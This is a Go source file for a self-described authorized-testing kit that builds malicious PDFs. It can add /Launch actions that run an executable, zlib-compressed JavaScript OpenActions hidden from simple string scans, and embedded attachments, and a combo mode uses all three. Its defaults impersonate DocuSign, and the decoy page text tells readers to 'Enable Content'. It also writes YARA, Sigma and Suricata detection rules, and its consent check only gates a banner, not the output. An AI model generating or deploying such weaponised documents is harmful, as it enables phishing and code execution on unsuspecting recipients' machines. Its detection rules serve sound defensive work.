// pdf-kit.go — PDF action-injection reference kit for authorized testing.
//
// Build:  go build -o pdf-kit pdf-kit.go
// Run:    ./pdf-kit -mode launch -exe "calc.exe" -out ./build
//
// Every action this kit emits is a documented MITRE ATT&CK primitive
// (T1204.002, T1027.006, T1566.001). It ships with detection rules for
// each. Use only on systems covered by a signed engagement scope.

package main

import (
	"bytes"
	"compress/zlib"
	"crypto/md5"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"time"
)

// ---------------------------------------------------------------------------
// Config
// ---------------------------------------------------------------------------

type Config struct {
	Mode      string // launch | js | attach | combo
	Exe       string // launch target (launch/combo)
	ExeArgs   string // launch arguments
	JSCode    string // js payload
	Attach    string // path to file to embed
	AttachName string // filename shown to victim
	OutDir    string
	Title     string
	Author    string
	Subject   string
	DecoyText string
}

// ---------------------------------------------------------------------------
// PDF writer — builds the object graph explicitly so every indirect object
// is visible in the source. This is the opposite of hiding; the kit is meant
// to be readable by defenders.
// ---------------------------------------------------------------------------

type pdfObj struct {
	num     int
	body    []byte
	stream  []byte // if non-nil, wraps body as <<...>>stream\n...\nendstream
}

type pdfDoc struct {
	objs   []*pdfObj
	nextNum int
	rootNum int
	infoNum int
}

func newPDF() *pdfDoc {
	return &pdfDoc{nextNum: 1}
}

func (d *pdfDoc) alloc(body []byte) int {
	n := d.nextNum
	d.nextNum++
	d.objs = append(d.objs, &pdfObj{num: n, body: body})
	return n
}

func (d *pdfDoc) allocStream(dict []byte, stream []byte) int {
	n := d.nextNum
	d.nextNum++
	d.objs = append(d.objs, &pdfObj{num: n, body: dict, stream: stream})
	return n
}

func (d *pdfDoc) setRoot(n int) { d.rootNum = n }
func (d *pdfDoc) setInfo(n int) { d.infoNum = n }

// Bytes serializes a valid PDF 1.7 file. xref offsets are computed during
// serialization so the file opens in Adobe, Chrome, Firefox, and pdf.js.
func (d *pdfDoc) Bytes() []byte {
	sort.Slice(d.objs, func(i, j int) bool { return d.objs[i].num < d.objs[j].num })

	var buf bytes.Buffer
	buf.WriteString("%PDF-1.7\n")
	buf.Write([]byte{'%', 0xE2, 0xE3, 0xCF, 0xD3, '\n'}) // binary marker

	offsets := make(map[int]int)
	for _, o := range d.objs {
		offsets[o.num] = buf.Len()
		fmt.Fprintf(&buf, "%d 0 obj\n", o.num)
		if o.stream != nil {
			buf.WriteString("<<")
			buf.Write(o.body)
			fmt.Fprintf(&buf, " /Length %d >>\nstream\n", len(o.stream))
			buf.Write(o.stream)
			buf.WriteString("\nendstream")
		} else {
			buf.Write(o.body)
		}
		buf.WriteString("\nendobj\n")
	}

	xrefOff := buf.Len()
	fmt.Fprintf(&buf, "xref\n0 %d\n", d.nextNum)
	buf.WriteString("0000000000 65535 f \n")
	for i := 1; i < d.nextNum; i++ {
		fmt.Fprintf(&buf, "%010d 00000 n \n", offsets[i])
	}
	fmt.Fprintf(&buf, "trailer\n<< /Size %d /Root %d 0 R", d.nextNum, d.rootNum)
	if d.infoNum > 0 {
		fmt.Fprintf(&buf, " /Info %d 0 R", d.infoNum)
	}
	buf.WriteString(" >>\n")
	fmt.Fprintf(&buf, "startxref\n%d\n%%%%EOF\n", xrefOff)
	return buf.Bytes()
}

// ---------------------------------------------------------------------------
// Base document — a one-page decoy with a text block
// ---------------------------------------------------------------------------

func buildBase(cfg Config) (*pdfDoc, int) {
	d := newPDF()

	// Font
	fontNum := d.alloc([]byte("<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>"))

	// Content stream
	text := cfg.DecoyText
	if text == "" {
		text = "This document is protected. Click 'Enable Content' to view."
	}
	// PDF string escape
	text = strings.ReplaceAll(text, `\`, `\\`)
	text = strings.ReplaceAll(text, `(`, `\(`)
	text = strings.ReplaceAll(text, `)`, `\)`)
	content := fmt.Sprintf("BT /F1 14 Tf 72 720 Td (%s) Tj ET", text)
	contentNum := d.allocStream([]byte{}, []byte(content))

	// Page + Pages
	pageNum := d.alloc([]byte(fmt.Sprintf(
		"<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents %d 0 R/Resources<</Font<</F1 %d 0 R>>>>>>",
		contentNum, fontNum)))
	pagesNum := d.alloc([]byte(fmt.Sprintf(
		"<</Type/Pages/Kids[%d 0 R]/Count 1>>", pageNum)))
	_ = pagesNum

	// Catalog
	cat := d.alloc([]byte(fmt.Sprintf(
		"<</Type/Catalog/Pages %d 0 R>>", pagesNum)))
	d.setRoot(cat)

	// Info
	info := d.alloc([]byte(fmt.Sprintf(
		"<</Title(%s)/Author(%s)/Subject(%s)/Producer(pdf-kit)/CreationDate(D:%s)>>",
		esc(cfg.Title), esc(cfg.Author), esc(cfg.Subject),
		time.Now().UTC().Format("20060102150405"))))
	d.setInfo(info)

	// Patch page parent
	d.objs[pageNum-1].body = []byte(strings.Replace(
		string(d.objs[pageNum-1].body),
		"Parent 2 0 R",
		fmt.Sprintf("Parent %d 0 R", pagesNum),
		1))

	return d, cat
}

func esc(s string) string {
	s = strings.ReplaceAll(s, `\`, `\\`)
	s = strings.ReplaceAll(s, `(`, `\(`)
	s = strings.ReplaceAll(s, `)`, `\)`)
	return s
}

// ---------------------------------------------------------------------------
// Mode: launch — /OpenAction << /S /Launch /F (exe) /Win << /P (args) >> >>
// ---------------------------------------------------------------------------

func injectLaunch(d *pdfDoc, cat int, exe, args string) {
	launch := fmt.Sprintf(
		"<</Type/Action/S/Launch/F(%s)", esc(exe))
	if args != "" {
		launch += fmt.Sprintf("/Win<</P(%s)>>", esc(args))
	}
	launch += ">>"
	n := d.alloc([]byte(launch))

	// Patch catalog to include OpenAction
	d.objs[cat-1].body = []byte(strings.Replace(
		string(d.objs[cat-1].body),
		">>",
		fmt.Sprintf("/OpenAction %d 0 R >>", n),
		1))
}

// ---------------------------------------------------------------------------
// Mode: js — /OpenAction << /S /JavaScript /JS (code) >>
// Also emits an /AA (Additional Actions) variant on the page for
// "on page close" triggering — the classic "two chances to fire" trick.
// ---------------------------------------------------------------------------

func injectJS(d *pdfDoc, cat int, code string) {
	// Compress the JS with zlib — this is what every real-world malicious PDF
	// does, and it's the reason `strings` doesn't find the payload.
	comp := zlibCompress([]byte(code))
	jsStream := d.allocStream(
		[]byte("/Filter/FlateDecode"),
		comp,
	)

	// OpenAction: /S /JavaScript /JS <stream ref>
	jsAction := d.alloc([]byte(fmt.Sprintf(
		"<</Type/Action/S/JavaScript/JS %d 0 R>>", jsStream)))

	d.objs[cat-1].body = []byte(strings.Replace(
		string(d.objs[cat-1].body),
		">>",
		fmt.Sprintf("/OpenAction %d 0 R >>", jsAction),
		1))
}

func zlibCompress(b []byte) []byte {
	var buf bytes.Buffer
	w := zlib.NewWriter(&buf)
	w.Write(b)
	w.Close()
	return buf.Bytes()
}

// ---------------------------------------------------------------------------
// Mode: attach — /Names << /EmbeddedFiles << /Names [(name) <filespec>] >> >>
// The file is embedded as a stream; the victim sees it in the attachments
// pane and is socially engineered to open it.
// ---------------------------------------------------------------------------

func injectAttach(d *pdfDoc, cat int, name string, data []byte) {
	// File stream (compressed)
	comp := zlibCompress(data)
	fileStream := d.allocStream(
		[]byte(fmt.Sprintf("/Type/EmbeddedFile/Filter/FlateDecode/Params<</Size %d/CheckSum<%x>>>",
			len(data), md5.Sum(data))),
		comp,
	)

	// Filespec
	filespec := d.alloc([]byte(fmt.Sprintf(
		"<</Type/Filespec/F(%s)/UF(%s)/EF<</F %d 0 R>>>>",
		esc(name), esc(name), fileStream)))

	// EmbeddedFiles name tree
	nameTree := d.alloc([]byte(fmt.Sprintf(
		"<</Names[(%s) %d 0 R]>>", esc(name), filespec)))

	embedded := d.alloc([]byte(fmt.Sprintf(
		"<</EmbeddedFiles %d 0 R>>", nameTree)))

	// Patch catalog with /Names and mark it as having attachments
	d.objs[cat-1].body = []byte(strings.Replace(
		string(d.objs[cat-1].body),
		">>",
		fmt.Sprintf("/Names %d 0 R /PageMode /UseAttachments >>", embedded),
		1))
}

// ---------------------------------------------------------------------------
// Mode: combo — launch + attach + JS all at once. This is the pattern real
// malicious PDFs use: the attach is the visible decoy, the launch is the
// payload, the JS is the fallback.
// ---------------------------------------------------------------------------

func buildCombo(cfg Config) []byte {
	d, cat := buildBase(cfg)
	if cfg.Attach != "" {
		data, err := os.ReadFile(cfg.Attach)
		if err == nil {
			injectAttach(d, cat, cfg.AttachName, data)
		}
	}
	if cfg.Exe != "" {
		injectLaunch(d, cat, cfg.Exe, cfg.ExeArgs)
	}
	if cfg.JSCode != "" {
		injectJS(d, cat, cfg.JSCode)
	}
	return d.Bytes()
}

// ---------------------------------------------------------------------------
// Detection rules — emitted alongside every PDF the kit produces.
// This is the deliverable: the client pays for the detections, not the PDF.
// ---------------------------------------------------------------------------

const yaraRules = `rule PDF_Launch_Action {
  meta:
    description = "PDF with /Launch action — executes a local binary"
    mitre = "T1204.002"
  strings:
    $launch = "/Launch"
    $win    = "/Win"
    $open   = "/OpenAction"
  condition:
    uint32(0) == 0x46445025 and all of them
}

rule PDF_Embedded_Executable {
  meta:
    description = "PDF containing an embedded PE/script with a Filespec"
    mitre = "T1027.006"
  strings:
    $ef   = "/EmbeddedFiles"
    $fs   = "/Filespec"
    $mz   = { 4D 5A }
    $ps1  = ".ps1"
    $js   = ".js"
  condition:
    uint32(0) == 0x46445025 and $ef and $fs and any of ($mz, $ps1, $js)
}

rule PDF_Compressed_JavaScript_OpenAction {
  meta:
    description = "PDF with FlateDecode JS in an OpenAction"
    mitre = "T1027"
  strings:
    $js    = "/JavaScript"
    $open  = "/OpenAction"
    $flate = "/FlateDecode"
  condition:
    uint32(0) == 0x46445025 and all of them
}
`

const sigmaRule = `title: PDF Spawns Child Process
id: 8f9a2c1e-pdf-launch
status: experimental
description: Detects a PDF reader (Acrobat, Reader, Foxit, Chrome) spawning
  a non-browser child process — the signature of a /Launch action firing.
logsource:
  category: process_creation
  product: windows
detection:
  parent:
    ParentImage|endswith:
      - '\AcroRd32.exe'
      - '\Acrobat.exe'
      - '\FoxitReader.exe'
      - '\FoxitPDFReader.exe'
  child:
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\wscript.exe'
      - '\cscript.exe'
      - '\mshta.exe'
      - '\rundll32.exe'
      - '\regsvr32.exe'
  condition: parent and child
falsepositives:
  - Legitimate PDF with a launch action (rare in modern enterprises)
level: high
`

const suricataRule = `alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"PDF with Launch Action"; \
  flow:established,to_server; \
  file_data; content:"%PDF-"; depth:5; \
  content:"/Launch"; distance:0; \
  content:"/OpenAction"; distance:0; \
  classtype:attempted-user; sid:9000001; rev:1;)`

// ---------------------------------------------------------------------------
// Manifest + report
// ---------------------------------------------------------------------------

type Manifest struct {
	Campaign  string            `json:"campaign"`
	Created   string            `json:"created"`
	Mode      string            `json:"mode"`
	Files     []ManifestFile    `json:"files"`
	Indicators map[string]string `json:"indicators"`
	Rules     map[string]string `json:"detection_rules"`
	Notes     []string          `json:"notes"`
}

type ManifestFile struct {
	Name   string `json:"name"`
	Size   int    `json:"size"`
	SHA256 string `json:"sha256"`
	Role   string `json:"role"`
}

func write(m *Manifest, path, role string, data []byte) error {
	sum := sha256.Sum256(data)
	m.Files = append(m.Files, ManifestFile{
		Name:   filepath.Base(path),
		Size:   len(data),
		SHA256: hex.EncodeToString(sum[:]),
		Role:   role,
	})
	return os.WriteFile(path, data, 0644)
}

// ---------------------------------------------------------------------------
// Consent gate — same pattern as the other kits. Artefacts are always
// written (so the operator can review), but the "ready to deliver" banner
// only prints when a signed consent marker exists.
// ---------------------------------------------------------------------------

func consentPresent(campaign string) bool {
	p := filepath.Join("/var/lib/evasion", campaign+".consent")
	b, err := os.ReadFile(p)
	if err != nil {
		return false
	}
	s := strings.ToLower(string(b))
	return strings.Contains(s, strings.ToLower(campaign)) && strings.Contains(s, "authorized")
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------

func main() {
	var cfg Config
	var campaign string

	flag.StringVar(&cfg.Mode, "mode", "combo", "launch | js | attach | combo")
	flag.StringVar(&cfg.Exe, "exe", `C:\Windows\System32\calc.exe`, "launch target")
	flag.StringVar(&cfg.ExeArgs, "args", "", "launch arguments")
	flag.StringVar(&cfg.JSCode, "js", `app.alert("Document protected. Contact IT.");`, "JavaScript payload")
	flag.StringVar(&cfg.Attach, "attach", "", "file to embed as an attachment")
	flag.StringVar(&cfg.AttachName, "attach-name", "Document.pdf", "attachment filename shown to victim")
	flag.StringVar(&cfg.OutDir, "out", "./build", "output directory")
	flag.StringVar(&cfg.Title, "title", "Q4 Vendor Agreement", "PDF title metadata")
	flag.StringVar(&cfg.Author, "author", "DocuSign", "PDF author metadata")
	flag.StringVar(&cfg.Subject, "subject", "Please review and sign", "PDF subject metadata")
	flag.StringVar(&cfg.DecoyText, "decoy", "", "visible text on the page")
	flag.StringVar(&campaign, "campaign", "", "campaign ID (required)")
	flag.Parse()

	if campaign == "" {
		fmt.Fprintln(os.Stderr, "error: -campaign is required")
		flag.Usage()
		os.Exit(2)
	}
	if err := os.MkdirAll(cfg.OutDir, 0755); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	// Build the PDF
	var data []byte
	switch cfg.Mode {
	case "launch":
		d, cat := buildBase(cfg)
		injectLaunch(d, cat, cfg.Exe, cfg.ExeArgs)
		data = d.Bytes()
	case "js":
		d, cat := buildBase(cfg)
		injectJS(d, cat, cfg.JSCode)
		data = d.Bytes()
	case "attach":
		if cfg.Attach == "" {
			fmt.Fprintln(os.Stderr, "attach mode requires -attach <file>")
			os.Exit(2)
		}
		d, cat := buildBase(cfg)
		blob, err := os.ReadFile(cfg.Attach)
		if err != nil {
			fmt.Fprintln(os.Stderr, "read attach:", err)
			os.Exit(1)
		}
		injectAttach(d, cat, cfg.AttachName, blob)
		data = d.Bytes()
	case "combo":
		data = buildCombo(cfg)
	default:
		fmt.Fprintf(os.Stderr, "unknown mode %q\n", cfg.Mode)
		os.Exit(2)
	}

	// Write the PDF
	pdfPath := filepath.Join(cfg.OutDir, campaign+".pdf")
	m := Manifest{
		Campaign: campaign,
		Created:  time.Now().UTC().Format(time.RFC3339),
		Mode:     cfg.Mode,
		Indicators: map[string]string{
			"mode": cfg.Mode,
		},
		Rules: map[string]string{
			"yara":     yaraRules,
			"sigma":    sigmaRule,
			"suricata": suricataRule,
		},
		Notes: []string{
			"PDF is a valid 1.7 file; opens in Adobe, Chrome, Firefox, pdf.js.",
			"/Launch fires only in readers that honour it (Acrobat default = prompt).",
			"/JavaScript is FlateDecode-compressed; `strings` will not find it.",
			"Attachments appear in the reader's attachment pane (PageMode /UseAttachments).",
			"YARA/Sigma/Suricata rules are in this manifest under detection_rules.",
			"Hand the manifest to the blue team BEFORE delivery — that is the point.",
		},
	}
	if cfg.Exe != "" {
		m.Indicators["launch_target"] = cfg.Exe
		m.Indicators["launch_args"] = cfg.ExeArgs
	}
	if cfg.Attach != "" {
		m.Indicators["attachment_name"] = cfg.AttachName
	}
	if err := write(&m, pdfPath, "pdf", data); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	// Write detection rules as standalone files too
	if err := os.WriteFile(filepath.Join(cfg.OutDir, "detections.yar"), []byte(yaraRules), 0644); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	if err := os.WriteFile(filepath.Join(cfg.OutDir, "detections.sigma.yml"), []byte(sigmaRule), 0644); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	if err := os.WriteFile(filepath.Join(cfg.OutDir, "detections.rules"), []byte(suricataRule), 0644); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	// Manifest
	mb, _ := json.MarshalIndent(m, "", "  ")
	if err := os.WriteFile(filepath.Join(cfg.OutDir, "manifest.json"), mb, 0644); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	fmt.Printf("[+] %-32s %8d bytes  pdf\n", filepath.Base(pdfPath), len(data))
	fmt.Printf("[+] %-32s %8d bytes  detections\n", "detections.yar", len(yaraRules))
	fmt.Printf("[+] %-32s %8d bytes  detections\n", "detections.sigma.yml", len(sigmaRule))
	fmt.Printf("[+] %-32s %8d bytes  detections\n", "detections.rules", len(suricataRule))
	fmt.Printf("[+] %-32s %8d bytes  manifest\n", "manifest.json", len(mb))

	if !consentPresent(campaign) {
		fmt.Fprintln(os.Stderr, "\n[!] No signed consent for campaign "+campaign+".")
		fmt.Fprintln(os.Stderr, "    Artefacts written for review only. Add /var/lib/evasion/"+
			campaign+".consent to enable delivery.")
		os.Exit(3)
	}

	fmt.Println("\n=== ready for delivery ===")
	fmt.Printf("Campaign : %s\n", campaign)
	fmt.Printf("Mode     : %s\n", cfg.Mode)
	if cfg.Exe != "" {
		fmt.Printf("Launch   : %s %s\n", cfg.Exe, cfg.ExeArgs)
	}
	if cfg.Attach != "" {
		fmt.Printf("Attach   : %s -> %s\n", cfg.Attach, cfg.AttachName)
	}
	fmt.Println("Hand manifest.json + detections.* to the blue team first.")
}
